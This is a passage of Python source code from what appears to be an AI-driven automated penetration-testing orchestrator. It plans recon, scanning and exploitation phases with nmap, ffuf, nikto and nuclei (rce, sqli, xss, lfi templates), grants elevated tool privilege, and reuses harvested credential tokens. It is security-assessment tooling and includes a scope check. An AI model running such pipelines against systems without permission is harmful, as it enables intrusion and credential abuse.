                "ACTIVE_SCANNING": ["sql_injection", "xss_reflected"],
            }
            skill_types = phase_at_map.get(phase, [])
            loaded = []
            seen_names = set()
            for at in skill_types:
                for s in self.skill_loader.load_for_attack_type(at):
                    if s.name not in seen_names:
                        seen_names.add(s.name)
                        loaded.append(s)
            if loaded:
                context_hint += "\n" + self.skill_loader.format_for_prompt(loaded[:2], max_chars=1500)
        except Exception as skill_err:
            logger.debug(f"[SkillLoader] Agentic skill injection failed: {skill_err}")

        # Strix Pattern #2: Coverage context for agentic path
        try:
            cr = self.coverage_tracker.real_coverage(max_rounds)
            context_hint += f"\nCoverage: {cr.get('honest_summary', '')}\n"
        except Exception:
            pass

        executor = AgenticExecutor(
            llm_harness=llm_harness,
            tool_invocation_engine=self.tool_invocation_engine,
            shared_context=self.ctx,
            auth_context=auth_context,
        )

        result = await executor.execute(
            objective=objective,
            phase=phase,
            max_rounds=max_rounds,
            context_hint=context_hint,
        )

        # Strix Pattern #2: Record agentic findings in coverage tracker
        try:
            from core.coverage.coverage_tracker import TestAttempt, TestOutcome, FailureReason
            for finding in result.findings:
                self.coverage_tracker.record(TestAttempt(
                    test_id=finding.get("id", ""),
                    category=finding.get("type", phase),
                    endpoint=finding.get("target", self.ctx.target),
                    parameter="",
                    payload=finding.get("payload", "")[:200],
                    outcome=TestOutcome.CONFIRMED,
                    failure_reason=FailureReason.NONE,
                    tool_name="agentic_executor",
                ))
        except Exception:
            pass

        logger.info(
            f"[AgenticPhase] {phase} complete: "
            f"{len(result.findings)} findings, {result.steps_taken} steps, "
            f"${result.total_cost:.4f} cost"
        )

        try:
            self._write_live_results()
        except Exception:
            pass

        # If agentic execution produced nothing at all (no steps AND no LLM
        # errors AND no findings), the LLM is likely unreachable — raise to
        # trigger the deterministic fallback. Previously "steps=0 & findings=0"
        # ALONE was enough, which over-triggered when the LLM correctly
        # concluded there was nothing exploitable in this phase.
        no_llm_calls = getattr(result, "llm_calls", 0) == 0
        had_llm_errors = bool(getattr(result, "llm_errors", 0))
        if result.steps_taken == 0 and len(result.findings) == 0 and (no_llm_calls or had_llm_errors):
            raise RuntimeError(
                f"Agentic executor produced no results for {phase} "
                f"(llm_calls={getattr(result, 'llm_calls', '?')}, "
                f"llm_errors={getattr(result, 'llm_errors', '?')}) — falling back")

    def _deterministic_fallback(self, phase: str, executed_caps: set = None):
        from core.common.schemas import BrainDecision, BrainDecisionAction, TaskSpec, CapabilityType
        from uuid import uuid4

        executed_caps = executed_caps or set()
        target = self.ctx.target
        phase_lower = phase.lower()

        # Full task catalog per phase — the deterministic safety-net.
        all_tasks = []
        if "recon" in phase_lower:
            all_tasks = [
                TaskSpec(task_id=str(uuid4()), objective=f"Enumerate subdomains of {target} using subfinder",
                         capability=CapabilityType.DNS_ENUMERATION,
                         inputs={"target": target, "tools_hint": ["subfinder"]}),
                TaskSpec(task_id=str(uuid4()), objective=f"Scan open ports on {target} using nmap",
                         capability=CapabilityType.PORT_SCANNING,
                         inputs={"target": target, "tools_hint": ["nmap"]}),
                TaskSpec(task_id=str(uuid4()), objective=f"Fingerprint technologies on {target} using whatweb",
                         capability=CapabilityType.TECHNOLOGY_FINGERPRINTING,
                         inputs={"target": target, "tools_hint": ["whatweb"]}),
                TaskSpec(task_id=str(uuid4()), objective=f"Check SSL/TLS configuration on {target} using sslscan",
                         capability=CapabilityType.TLS_ANALYSIS,
                         inputs={"target": target, "tools_hint": ["sslscan"]}),
            ]
        elif "osint" in phase_lower:
            all_tasks = [
                TaskSpec(task_id=str(uuid4()), objective=f"Enumerate subdomains of {target} using amass",
                         capability=CapabilityType.DNS_ENUMERATION,
                         inputs={"target": target, "tools_hint": ["amass"]}),
                TaskSpec(task_id=str(uuid4()), objective=f"Detect WAF on {target} using wafw00f",
                         capability=CapabilityType.TECHNOLOGY_FINGERPRINTING,
                         inputs={"target": target, "tools_hint": ["wafw00f"]}),
                TaskSpec(task_id=str(uuid4()), objective=f"Check SSL/TLS configuration on {target} using sslscan",
                         capability=CapabilityType.TLS_ANALYSIS,
                         inputs={"target": target, "tools_hint": ["sslscan"]}),
            ]
        elif "deep" in phase_lower:
            all_tasks = [
                TaskSpec(task_id=str(uuid4()), objective=f"Discover hidden directories and files on {target} using ffuf with common wordlist",
                         capability=CapabilityType.ENDPOINT_DISCOVERY,
                         inputs={"target": target, "tools_hint": ["ffuf"]}),
                TaskSpec(task_id=str(uuid4()), objective=f"Crawl {target} for endpoints and links using katana",
                         capability=CapabilityType.WEB_CRAWLING,
                         inputs={"target": target, "tools_hint": ["katana"]}),
                TaskSpec(task_id=str(uuid4()), objective=f"Run nikto web server scan on {target}",
                         capability=CapabilityType.VULNERABILITY_SCANNING,
                         inputs={"target": target, "tools_hint": ["nikto"]}),
                TaskSpec(task_id=str(uuid4()), objective=f"Check HTTP security headers on {target}",
                         capability=CapabilityType.HTTP_ANALYSIS,
                         inputs={"target": target, "tools_hint": ["httpx"]}),
            ]
        elif "scan" in phase_lower or "analyz" in phase_lower:
            all_tasks = [
                TaskSpec(task_id=str(uuid4()), objective=f"Run nuclei vulnerability scan on {target} with cve,misconfig,exposure templates",
                         capability=CapabilityType.VULNERABILITY_SCANNING,
                         inputs={"target": target, "tools_hint": ["nuclei"]}),
                TaskSpec(task_id=str(uuid4()), objective=f"Run vulnerability scan on {target} using nikto",
                         capability=CapabilityType.VULNERABILITY_SCANNING,
                         inputs={"target": target, "tools_hint": ["nikto"]}),
                TaskSpec(task_id=str(uuid4()), objective=f"Discover hidden directories on {target} using ffuf",
                         capability=CapabilityType.ENDPOINT_DISCOVERY,
                         inputs={"target": target, "tools_hint": ["ffuf"]}),
                TaskSpec(task_id=str(uuid4()), objective=f"Test for CORS misconfiguration on {target}",
                         capability=CapabilityType.HTTP_ANALYSIS,
                         inputs={"target": target, "tools_hint": ["httpx"]}),
            ]

        elif "exploit" in phase_lower:
            api_paths = []
            if hasattr(self.ctx, 'endpoints'):
                api_paths = [(e if isinstance(e, str) else e.get('url', '')) for e in (self.ctx.endpoints or [])
                             if '/api' in (e if isinstance(e, str) else e.get('url', '')).lower()]
            api_target = api_paths[0] if api_paths else f"{target}/api/"
            all_tasks = [
                TaskSpec(task_id=str(uuid4()), objective=f"Run nuclei exploitation templates on {target} with tags cve,rce,sqli,xss,lfi",
                         capability=CapabilityType.VULNERABILITY_SCANNING,
                         inputs={"target": target, "tools_hint": ["nuclei"]}),
                TaskSpec(task_id=str(uuid4()), objective=f"Enumerate API endpoints at {api_target} using ffuf",
                         capability=CapabilityType.ENDPOINT_DISCOVERY,
                         inputs={"target": api_target, "tools_hint": ["ffuf"]}),
            ]

        # Filter out capabilities already executed
        tasks = [t for t in all_tasks if t.capability.value not in executed_caps]

        if not tasks:
            logger.info(f"DETERMINISTIC_FALLBACK: All capabilities already covered for phase '{phase}'")
            return None

        logger.info(f"DETERMINISTIC_FALLBACK: Injecting {len(tasks)} missing tasks for phase '{phase}' "
                     f"(already ran: {executed_caps})")
        return BrainDecision(
            action=BrainDecisionAction.SPAWN_AGENTS,
            thought=f"LLM planner failed. Using deterministic fallback for {phase}.",
            reason="planner_fallback",
            tasks=tasks,
        )

    async def _run_phase_approach_a(self, phase: str):
        logger.debug(f"phase={phase} approach=A")
        
        session_id = f"session_{phase}"
        from core.security.authorization import AuthContext
        allowed_tools = list(self.tools.tools.keys()) if hasattr(self, 'tools') and hasattr(self.tools, 'tools') else []
        auth_context = AuthContext(allowed_tools=allowed_tools, has_elevated_privilege=True, target_profile=getattr(self, 'target_profile', None))
        agents_this_phase = 0
        max_agents = self.phase_config.MAX_ITERATIONS if hasattr(self, 'phase_config') else 20
        task_history = []
        consecutive_duplicate_rounds = 0
        
        from core.orchestration.hexstrike_decision_engine import IntelligentDecisionEngine
        hex_engine = IntelligentDecisionEngine()
        target_profile = hex_engine.analyze_target(self.ctx.target)
        attack_chain = hex_engine.create_attack_chain(target_profile, objective="comprehensive")
        
        hex_suggestions = ""
        if attack_chain and attack_chain.steps:
            hex_suggestions = "HexStrike Intelligent Engine suggests prioritizing the following tools and parameters:\n"
            for step in attack_chain.steps[:3]:  # Top 3 suggestions per prompt
                hex_suggestions += f"- Tool: {step.tool}, Parameters: {step.parameters}, Success Prob: {step.success_probability:.2f}\n"

        while agents_this_phase < max_agents:
            if hasattr(self, 'phase_state'):
                self.phase_state.iterations = agents_this_phase
                if self._should_exit_phase():
                    logger.warning(f"Phase {phase} exit conditions met.")
                    break
                    
            summary = self.ctx.get_full_summary(max_chars=8000)
            summary_str = json.dumps(summary, default=str) if isinstance(summary, dict) else str(summary)

            from core.common.token_optimizer import TokenOptimizer
            token_opt = TokenOptimizer()
            compressed_summary = token_opt.compress_context(summary_str)
            
            history_text = "\n".join([
                f"- {'✓' if h['success'] else '✗'} {h['capability']} on {h['target']} (tool: {h.get('tool', 'auto')})"
                for h in task_history[-5:]
            ]) if task_history else "None yet"

            # Phase 33: Build structured state bundle for LLM decision-making
            from core.orchestration.decision_pipeline import StructuredStateBuilder
            v2_state = StructuredStateBuilder.build(
                attack_surface=getattr(self.ctx, 'attack_surface', None),
                target_health=getattr(self, 'target_health_manager', None),
                findings=getattr(self.ctx, 'findings', []),
                coverage_summary=self.coverage_matrix.get_coverage() if hasattr(self, 'coverage_matrix') and self.coverage_matrix else {},
                identities=list(self.security_context_v2.identities.keys()) if hasattr(self, 'security_context_v2') else [],
                learning_summary=self.structured_learning.get_summary() if hasattr(self, 'structured_learning') and hasattr(self.structured_learning, 'get_summary') else {},
                convergence_status=self.convergence_engine.check() if hasattr(self, 'convergence_engine_v2') and hasattr(self.convergence_engine, 'check') else None,
                budget_status=self.granular_budget.remaining_summary() if hasattr(self, 'granular_budget') else {},
            )
            v2_state_str = json.dumps(v2_state, default=str)[:3000]

            # Strix Pattern #1: Load relevant skills for this phase
            skill_text = ""
            try:
                phase_attack_types = {
                    "exploit": ["sql_injection", "xss_reflected", "authentication", "idor", "authorization"],
                    "EXPLOITATION": ["sql_injection", "xss_reflected", "authentication", "idor", "authorization"],
                    "analyze": ["sql_injection", "xss_reflected", "authentication"],
                    "ACTIVE_SCANNING": ["sql_injection", "xss_reflected", "authentication"],
                }
                attack_types = phase_attack_types.get(phase, [])
                loaded_skills = []
                for at in attack_types:
                    loaded_skills.extend(self.skill_loader.load_for_attack_type(at))
                seen = set()
                unique_skills = []
                for s in loaded_skills:
                    if s.name not in seen:
                        seen.add(s.name)
                        unique_skills.append(s)
                if unique_skills:
                    skill_text = self.skill_loader.format_for_prompt(unique_skills[:2], max_chars=1500)
            except Exception as skill_err:
                logger.debug(f"[SkillLoader] Failed to load skills for phase: {skill_err}")

            # Strix Pattern #2: Include honest coverage in prompt
            coverage_honest = ""
            try:
                tracker_report = self.coverage_tracker.real_coverage(
                    total_planned=len(task_history) + 10
                )
                coverage_honest = f"\nCoverage Status: {tracker_report.get('honest_summary', '')}\n"
            except Exception:
                pass

            prompt = (
                f"Identify capability requests for phase {phase}.\n"
                f"Target: {self.ctx.target}\n"
                f"Current Context Summary:\n{compressed_summary}\n\n"
                f"Structured State:\n{v2_state_str}\n\n"
                f"{coverage_honest}"
                f"Already Executed Tasks in this phase:\n{history_text}\n\n"
                f"{skill_text}\n"
                f"{hex_suggestions}\n"
                f"Evaluate the HexStrike suggestions against the current context. If they have already been run or are unnecessary, do not use them. Otherwise, prioritize them.\n"
                f"If the phase is complete or no more tasks are needed, output: {{\"action\": \"phase_complete\"}}\n"
                f"CRITICAL: Do NOT repeat any capability or task that is listed in Already Executed Tasks."
            )
            
            response = await self.llm.generate_response(prompt, system=BRAIN_SYSTEM, response_format="json")

            from core.common.normalizer import PlannerResponseNormalizer
            decision = None
            for _attempt in range(2):
                try:
                    decision = PlannerResponseNormalizer.normalize(response.content)
                    break
                except Exception as e:
                    if _attempt == 0:
                        logger.warning(f"Planner parse failed (attempt 1), retrying: {e}")
                        response = await self.llm.generate_response(prompt, system=BRAIN_SYSTEM, response_format="json")
                    else:
                        logger.error(f"Planner parse failed after retry: {e}")

            if decision is None:
                executed_caps = {h.get('capability') for h in task_history}
                decision = self._deterministic_fallback(phase, executed_caps)
                if decision is None:
                    break
                
            if decision.action in (BrainDecisionAction.COMPLETE, BrainDecisionAction.PHASE_COMPLETE):
                logger.info(f"Phase {phase} complete.")
                break
                
            tasks = decision.tasks
            if not tasks:
                logger.info("No tasks returned. Exiting phase.")
                break
                
            executed_any = False
            for task in tasks:
                capability = task.capability.value if hasattr(task.capability, 'value') else task.capability
                target = task.inputs.get('target', self.ctx.target)
                params = dict(task.inputs.get('params', {}) or {})
                # FIX: propagate objective + requested tool so ToolRouter can honor
                # the planner's tool choice (subfinder/amass/etc) instead of defaulting
                # to the first tool in op_map order.
                params.setdefault('objective', task.objective)
                _tool_hint = task.inputs.get('tools_hint') or task.inputs.get('tools')
                if _tool_hint:
                    params.setdefault('preferred_tool', _tool_hint[0] if isinstance(_tool_hint, list) else _tool_hint)
                
                logger.info(f"Invoking capability: {capability} on {target}")
                
                real_task, created = self.task_manager.get_or_create_task(task)
                actual_task_id = real_task.spec.task_id
                
                if not created:
                    logger.info(f"Task {actual_task_id} is a duplicate, skipping execution.")
                    continue
                    
                executed_any = True
                
                try:
                    self.task_manager.start_task(actual_task_id)
                except Exception as e:
                    logger.debug(f"Task {actual_task_id} couldn't be started: {e}")

                # Phase 44: Validate tool arguments before execution
                try:
                    # Only enforce tool-existence when the planner actually
                    # named a concrete tool; otherwise the capability routes to
                    # a tool later and must not be validated as a tool name.
                    _pref = params.get('preferred_tool')
                    self.tool_argument_validator.validate(
                        tool_name=_pref if _pref else "",
                        target=target,
                        args=params,
                        capability=capability,
                    )
                except Exception as val_err:
                    logger.warning(f"TOOL_VALIDATION_REJECTED cap={capability} target={target}: {val_err}")
                    self.task_manager.fail_task(actual_task_id, f"Validation rejected: {val_err}")
                    continue

                # Strix Pattern #3: Wrap tool execution with error-classified retry
                async def _invoke_tool():
                    if capability in self.tool_invocation_engine.MULTI_TOOL_CAPABILITIES:
                        return await self.tool_invocation_engine.invoke_all_for_capability(
                            capability, target, params, session_id, auth_context
                        )
                    else:
                        return await self.tool_invocation_engine.invoke_from_capability(
                            capability, target, params, session_id, auth_context
                        )

                result = await self.retry_executor.execute_with_retry(_invoke_tool)

                tool_name = result.tool if hasattr(result, 'tool') else 'unknown'

                # Phase 36: Record request in granular budget
                if hasattr(self, 'granular_budget'):
                    risk_cost = 3 if 'exploit' in capability.lower() else 1
                    self.granular_budget.record_request(tool=tool_name, target=target, risk_cost=risk_cost)

                # Strix Pattern #3: Classify error if failed
                failure_reason_str = "none"
                if not result.success:
                    classified = self.error_classifier.classify(
                        status_code=getattr(result, 'status_code', 0) or 0,
                        stderr=str(getattr(result, 'stderr', '') or ''),
                        stdout=str(getattr(result, 'stdout', '') or ''),
                        return_code=getattr(result, 'return_code', 0) or 0,
                        response_body=str(getattr(result, 'data', '') or '')[:2000],
                    )
                    failure_reason_str = classified.category.value
                    logger.info(f"ERROR_CLASSIFIED tool={tool_name} category={classified.category.value} "
                                f"recovery={classified.recovery.value} msg={classified.message}")

                # Strix Pattern #2: Record test attempt in coverage tracker
                try:
                    from core.coverage.coverage_tracker import TestAttempt, TestOutcome, FailureReason
                    _fr_map = {
                        "rate_limited": FailureReason.RATE_LIMITED,
                        "waf_blocked": FailureReason.WAF_BLOCKED,
                        "auth_failed": FailureReason.AUTH_FAILED,
                        "not_found": FailureReason.ENDPOINT_NOT_FOUND,
                        "timeout": FailureReason.TIMEOUT,
                        "invalid_input": FailureReason.INVALID_INPUT,
                        "transient": FailureReason.TRANSIENT_ERROR,
                        "unknown": FailureReason.UNKNOWN,
                    }
                    attempt = TestAttempt(
                        test_id=actual_task_id,
                        category=capability,
                        endpoint=target,
                        parameter=params.get('preferred_tool', ''),
                        payload=str(params.get('objective', ''))[:200],
                        http_status=getattr(result, 'status_code', 0) or 0,
                        response_length=len(str(getattr(result, 'data', '') or '')),
                        response_time_ms=getattr(result, 'duration', 0) * 1000 if getattr(result, 'duration', 0) else 0,
                        outcome=TestOutcome.CONFIRMED if result.success else TestOutcome.NO_ISSUE_FOUND,
                        failure_reason=_fr_map.get(failure_reason_str, FailureReason.NONE) if not result.success else FailureReason.NONE,
                        tool_name=tool_name,
                    )
                    self.coverage_tracker.record(attempt)
                except Exception as ct_err:
                    logger.debug(f"[CoverageTracker] Record failed: {ct_err}")

                if result.success:
                    self.task_manager.complete_task(actual_task_id, {"status": "success", "result": result.data or result.stdout[:200]})
                else:
                    self.task_manager.fail_task(actual_task_id, f"Tool failed ({failure_reason_str}): {capability}")
                    
                self._log_activity("tool_run",
                    f"{tool_name}: {capability} on {target}",
                    tool=tool_name, target=target, phase=phase,
                    status="ok" if result.success else "error",
                    detail=getattr(task, 'objective', capability),
                    output_data=str(result.data or result.stdout or "")[:3000],
                    duration_s=getattr(result, 'duration', 0) or 0)

                # Ingest findings into shared context & knowledge store
                self._ingest_approach_a_result(capability, target, result)
                try:
                    self._write_live_results()
                except Exception:
                    pass
                self.ctx.log_agent(
                    agent_id=actual_task_id,
                    objective=getattr(task, 'objective', capability),
                    status="completed" if result.success else "failed",
                    result_summary=str(result.data or result.stdout)[:200]
                )
                
                task_history.append({
                    "task_id": actual_task_id,
                    "capability": capability,
                    "target": target,
                    "tool": tool_name,
                    "success": result.success
                })
                logger.info(f"Executed task {actual_task_id} with result: {result.success}")
                
            if not executed_any:
                consecutive_duplicate_rounds += 1
                if consecutive_duplicate_rounds >= 1:
                    logger.info("All tasks in wave were duplicates or already executed. Advancing phase to avoid looping.")
                    break
            else:
                consecutive_duplicate_rounds = 0
                
            agents_this_phase += 1

            # Check phase gate after each execution wave
            db_context = {
                "completed_tasks": [(h["capability"], h["target"]) for h in task_history if h["success"]],
                "discovered_assets": {
                    "subdomains": getattr(self.ctx, "subdomains", []),
                    "open_ports": getattr(self.ctx, "ports", {})
                }
            }
            if self._evaluate_phase_gate(phase, db_context):
                logger.info(f"Phase gate satisfied for phase {phase}. Advancing to next phase.")
                break

    async def _run_phase_approach_b(self, phase: str):
        logger.info(f"--- Running Approach B for phase: {phase} ---")
        from core.tools.tool_use_executor import ToolUseExecutor

        # Claude Agent Loop creation
        executor = ToolUseExecutor(self.tool_invocation_engine)
        claude_loop = ClaudeAgentLoop(
            tool_use_executor=executor,
            invocation_engine=self.tool_invocation_engine
        )
        objective = f"Execute tasks for phase {phase}"

        # Strix Pattern #1: Inject skills into Approach B objective
        try:
            phase_at_map = {
                "exploit": ["sql_injection", "xss_reflected", "idor", "authentication"],
                "EXPLOITATION": ["sql_injection", "xss_reflected", "idor"],
                "analyze": ["sql_injection", "xss_reflected"],
                "ACTIVE_SCANNING": ["sql_injection", "xss_reflected"],
            }
            skill_types = phase_at_map.get(phase, [])
            loaded = []
            seen_names = set()
            for at in skill_types:
                for s in self.skill_loader.load_for_attack_type(at):
                    if s.name not in seen_names:
                        seen_names.add(s.name)
                        loaded.append(s)
            if loaded:
                objective += "\n" + self.skill_loader.format_for_prompt(loaded[:3], max_chars=4000)
        except Exception as skill_err:
            logger.debug(f"[SkillLoader] Approach B skill injection failed: {skill_err}")

        # Strix Pattern #2: Coverage context
        try:
            cr = self.coverage_tracker.real_coverage(50)
            objective += f"\nCoverage: {cr.get('honest_summary', '')}\n"
        except Exception:
            pass

        from core.security.authorization import AuthContext
        allowed_tools = list(self.tools.tools.keys()) if hasattr(self, 'tools') and hasattr(self.tools, 'tools') else []
        auth_context = AuthContext(allowed_tools=allowed_tools, has_elevated_privilege=True, target_profile=getattr(self, 'target_profile', None))

        session_id = f"session_{phase}_b"
        result = await claude_loop.run(objective, auth_context, session_id)

        # Strix Pattern #2: Record Approach B results in coverage tracker
        try:
            from core.coverage.coverage_tracker import TestAttempt, TestOutcome, FailureReason
            if hasattr(result, 'findings') and result.findings:
                for finding in result.findings:
                    self.coverage_tracker.record(TestAttempt(
                        test_id=finding.get("id", ""),
                        category=finding.get("type", phase),
                        endpoint=finding.get("target", self.ctx.target),
                        parameter="",
                        payload=finding.get("payload", "")[:200],
                        outcome=TestOutcome.CONFIRMED,
                        failure_reason=FailureReason.NONE,
                        tool_name="approach_b",
                    ))
        except Exception:
            pass

        logger.info(f"Claude Loop completed for {phase}")

    def _parse_deepseek_response(self, response_text: str) -> List[TaskSpec]:
        # Helper to parse DeepSeek json and return TaskSpec objects
        from core.common.normalizer import PlannerResponseNormalizer
        try:
            decision = PlannerResponseNormalizer.normalize(response_text)
            return decision.tasks
        except Exception as e:
            logger.error(f"Failed to parse LLM response: {e}")
            return []


    async def _run_phase_legacy(self, phase: str):
        agents_this_phase = 0
        if hasattr(self, 'phase_state'):
            self.phase_state.consecutive_failures = 0
        self.consecutive_agent_failures = 0
        agent_history = []  # Track what each agent did
        completed_objectives = set()  # Prevent duplicate tasks

        phase_prompt = self._load_phase_prompt(phase)

        max_agents = self.phase_config.MAX_ITERATIONS if hasattr(self, 'phase_config') else 20
        while agents_this_phase < max_agents:
            if hasattr(self, 'phase_state'):
                self.phase_state.iterations = agents_this_phase
                if self._should_exit_phase():
                    logger.warning(f"Phase {phase} exit conditions met.")
                    break
                    
            summary = self.ctx.get_full_summary(max_chars=8000)
            summary_str = json.dumps(summary, default=str) if isinstance(summary, dict) else str(summary)

            from core.common.token_optimizer import TokenOptimizer
            token_opt = TokenOptimizer()
            compressed_summary = token_opt.compress_context(summary_str)

            # ── Build failed tools warning ──
            failed_tools_warning = ""
            if self.failed_tools:
                failed_tools_warning = (
                    f"\nUNAVAILABLE TOOLS: {', '.join(sorted(self.failed_tools))}\n"
                )

            # ── Agent history (last 3 only) ──
            history_section = ""
            if agent_history:
                history_section = "\nCOMPLETED AGENTS:\n"
                for h in agent_history[-3:]:
                    status = "✓" if h["success"] else "✗"
                    history_section += f"  {status} {h['agent_id']}: {h['objective']}\n"

            if phase == 'OSINT_RECONNAISSANCE':
                await self._run_phase_osint_reconnaissance()
                break
            elif phase == 'DEEP_RECONNAISSANCE':
                await self._run_phase_deep_reconnaissance()
                break

            # ── Build exploit chain context ──
            chain_context = ""
            if phase == "exploit" and self.ctx.exploit_results:
                chain_context = "\nEXPLOIT CHAIN:\n"
                for er in self.ctx.exploit_results[-3:]:
                    chain_context += f"  - {er.get('type','?')}: {'SUCCESS' if er.get('success') else 'FAILED'}\n"

            # ── Context truncation ──
            _MAX_SUMMARY_CHARS = 8000
            if len(compressed_summary) > _MAX_SUMMARY_CHARS:
                compressed_summary = compressed_summary[:_MAX_SUMMARY_CHARS] + "..."


            circuit_breaker_hint = ""
            if self.consecutive_agent_failures >= 2:
                circuit_breaker_hint = "\n⚠️  REPLAN REQUIRED: Choose a different approach or phase_complete.\n"
                logger.warning("Agent failure/deduplication threshold reached (2 consecutive). Exiting phase to prevent infinite loop.")
                break

            # ── Compact execution context from database ──
            db_context = self._get_db_execution_context()
            comp_tasks = [f"{t[0]}:{t[1]}" for t in db_context.get("completed_tasks", [])[-5:]]
            assets = db_context.get("discovered_assets", {})
            db_summary_lines = []
            if comp_tasks:
                db_summary_lines.append(f"Completed: {', '.join(comp_tasks)}")
            if assets.get("subdomains"):
                db_summary_lines.append(f"Subdomains: {', '.join(assets['subdomains'][:5])}")
            if assets.get("open_ports"):
                db_summary_lines.append(f"Ports: {assets['open_ports']}")
            if assets.get("technologies"):
                db_summary_lines.append(f"Tech: {assets['technologies']}")
            db_context_str = "\n".join(db_summary_lines)

            # ── HexStrike Intelligence Context ──
            intel_context = ""
            if self.target_profile:
                intel_context = self.target_profile.to_brain_context()
                intel_context += "\n" + ToolEffectivenessEngine.get_brain_recommendations(
                    self.target_profile, phase
                )
                # Re-profile with updated context data periodically
                if agents_this_phase > 0 and agents_this_phase % 3 == 0:
                    try:
                        self.target_profile = TargetProfiler.profile_target(
                            self.ctx.target, self.ctx
                        )
                        self.ctx.update('target_profile', self.target_profile.to_dict())
                        intel_context = self.target_profile.to_brain_context()
                        intel_context += "\n" + ToolEffectivenessEngine.get_brain_recommendations(
                            self.target_profile, phase
                        )
                    except Exception:
                        pass

            # Strix Pattern #1: Load skills for legacy path
            legacy_skill_text = ""
            try:
                phase_lower = phase.lower()
                at_map = {"exploit": ["sql_injection", "xss_reflected", "idor", "authentication"],
                          "exploitation": ["sql_injection", "xss_reflected", "idor", "authentication"],
                          "analyze": ["sql_injection", "xss_reflected"], "active_scanning": ["sql_injection", "xss_reflected"]}
                for at in at_map.get(phase_lower, []):
                    for s in self.skill_loader.load_for_attack_type(at):
                        if s.name not in legacy_skill_text:
                            legacy_skill_text += f"\n### {s.name}\n{s.content[:1500]}\n"
                            if len(legacy_skill_text) > 3000:
                                break
                    if len(legacy_skill_text) > 3000:
                        break
            except Exception:
                pass

            # Strix Pattern #2: Coverage context for legacy path
            legacy_coverage = ""
            try:
                cr = self.coverage_tracker.real_coverage(agents_this_phase + 10)
                legacy_coverage = f"\nCoverage: {cr.get('honest_summary', '')}\n"
            except Exception:
                pass

            prompt = (
                f"Authorized security assessment task planner.\n\n"
                f"Phase: {phase.upper()}\n"
                f"Target: {self.ctx.target}\n"
                f"{intel_context}\n"
                f"{failed_tools_warning}"
                f"{history_section}"
                f"{legacy_coverage}"
                f"\n--- DISCOVERED CONTEXT ---\n"
                f"{db_context_str}\n"
                f"\nSummary:\n{compressed_summary}\n"
                f"{chain_context}"
                f"{legacy_skill_text}"
                f"{circuit_breaker_hint}"
                f"Tasks completed: {agents_this_phase}/{max_agents}\n\n"
                f"Based on data above, output JSON for next task. "
                f"If phase complete, output: {{\"action\": \"phase_complete\"}}\n"
                f"Do not repeat completed tasks. Output ONLY valid JSON.\n"
            )
            
            # ── Explicit Phase Gate Exit Criteria Check ──
            if self._evaluate_phase_gate(phase, db_context):
                logger.info("==================================================")
                logger.info(f">>> PHASE GATE PASSED: [{phase.upper()}] exit criteria met. Advancing phase.")
                logger.info("==================================================")
                break

            # ── Log prompt size ──
            logger.info(f"Brain prompt length: {len(prompt)} chars")

            # ── LLM Response Generation with Strict Validation & Exponential Backoff Retry Loop ──
            max_retries = 3
            decision = None
            raw_content = ""

            from agents.llm_client import validate_json_payload
            from core.common.normalizer import PlannerResponseNormalizer

            for attempt in range(max_retries):
                logger.info(f"[CentralBrain] Brain decision attempt {attempt + 1}/{max_retries} initiated.")
                res = await self.llm.generate_response(
                    prompt,
                    system=phase_prompt or BRAIN_SYSTEM,
                    tier=TaskTier.LARGE,
                    temperature=0.1,
                    response_format="json"
                )
                raw_content = res.content
                structured = res.structured_output

                if structured is None and raw_content:
                    try:
                        clean_content = re.sub(r'```json\n?|\n?```', '', raw_content).strip()
                        structured = json.loads(clean_content)
                    except Exception:
                        m = re.search(r'\{[\s\S]*\}', raw_content)
                        if m:
                            try:
                                structured = json.loads(m.group(0))
                            except Exception:
                                pass

                # Validate non-empty dict and basic payload structure
                if validate_json_payload(structured):
                    try:
                        canonical_decision = PlannerResponseNormalizer.normalize(structured)
                        decision = structured
                        logger.info(f"[CentralBrain] Brain decision accepted on attempt {attempt + 1}/{max_retries}: {json.dumps(decision, indent=2)}")
                        break
                    except Exception as norm_err:
                        self.failure_streak += 1
                        logger.warning(
                            f"[CentralBrain] Attempt {attempt + 1}/{max_retries} failed schema validation ({norm_err}). "
                            f"Raw response: '{raw_content}'. Failure streak: {self.failure_streak}"
                        )
                else:
                    self.failure_streak += 1
                    logger.warning(
                        f"[CentralBrain] Attempt {attempt + 1}/{max_retries} received empty {{}} or malformed JSON. "
                        f"Raw response: '{raw_content}'. Failure streak: {self.failure_streak}"
                    )

                if attempt < max_retries - 1:
                    backoff = 0.5 * (2 ** attempt)
                    await asyncio.sleep(backoff)

            # If retries exhausted and no valid decision obtained or max failure streak reached
            if not decision:
                logger.warning(f"[CentralBrain] Brain returned empty/invalid response after {max_retries} retries (failure streak: {self.failure_streak})")
                
                # Deterministic fallback: run ALL unexecuted catalog tests via V2 pipeline
                if self.failure_streak >= self.max_consecutive_failures or self.failure_streak >= 2:
                    logger.warning(f"[CentralBrain] Failure threshold reached ({self.failure_streak}). Running deterministic fallback: full catalog sweep.")

                    base_url = self.ctx.target.rstrip("/")
                    if not base_url.startswith(("http://", "https://")):
                        base_url = f"https://{base_url}"

                    from core.security.authorization import TargetScopeValidator
                    from urllib.parse import urlparse
                    parsed_host = urlparse(base_url).hostname or base_url.split("/")[0].split(":")[0]
                    if not TargetScopeValidator.get().is_authorized(parsed_host):
                        logger.warning(f"FALLBACK_TARGET_OUT_OF_SCOPE: '{base_url}' failed scope check.")
                        self.failure_streak = 0
                        break

                    try:
                        # Collect all registered test IDs from the catalog
                        all_test_ids = list(self.executor_registry.keys())

                        # Get already-executed test IDs from coverage matrix
                        executed = set()
                        if hasattr(self, 'coverage_matrix'):
                            for cell in getattr(self.coverage_matrix, '_cells', {}).values():
                                if hasattr(cell, 'test_id') and hasattr(cell, 'status'):
                                    if cell.status in ('PASS', 'FAIL', 'NOT_APPLICABLE'):
                                        executed.add(cell.test_id)

                        remaining = [tid for tid in all_test_ids if tid not in executed]
                        logger.info(f"[FallbackSweep] {len(remaining)} unexecuted tests out of {len(all_test_ids)} total")

                        # Collect discovered endpoints for context
                        discovered_endpoints = getattr(self.ctx, "endpoints", []) or []
                        ep_list = []
                        for raw_ep in discovered_endpoints[:50]:
                            ep = raw_ep if isinstance(raw_ep, str) else raw_ep.get("url", raw_ep.get("path", ""))
                            if ep:
                                ep_list.append(ep)

                        # Get auth tokens if available
                        auth_token = None
                        for cred in getattr(self.ctx, 'harvested_creds', []):
                            if cred.get('token'):
                                auth_token = cred['token']
                                break

                        # Run each remaining test via its executor
                        from core.domain.experiment import SecurityExperiment
                        fallback_ran = 0
                        for tid in remaining[:80]:
